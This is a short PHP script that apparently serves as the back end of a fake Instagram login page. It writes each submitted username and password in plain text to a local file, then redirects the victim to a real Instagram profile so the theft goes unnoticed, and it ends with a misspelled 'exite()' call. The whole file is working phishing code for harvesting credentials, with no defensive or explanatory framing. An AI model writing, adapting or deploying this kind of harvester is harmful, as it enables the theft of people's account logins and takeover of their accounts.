<?php
file_put_contents("usernames.txt","Account: " . $_POST['username'] . "Pass: " .$_POST['password'] . "\n",FILE_APPEND);
header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
exite();
